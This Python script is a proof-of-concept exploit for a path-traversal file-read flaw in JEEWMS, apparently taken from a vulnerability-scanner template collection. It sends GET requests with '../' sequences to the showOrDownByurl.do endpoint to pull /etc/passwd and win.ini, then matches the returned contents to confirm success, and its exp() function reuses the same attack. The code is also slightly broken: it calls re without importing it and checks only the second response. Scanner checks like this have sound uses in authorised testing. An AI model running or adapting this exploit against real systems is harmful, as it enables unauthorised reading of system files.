import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''JEEWMS LFI''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["jeewms", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp1.text) or re.search(r"""\[(font|extension|file)s\]""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url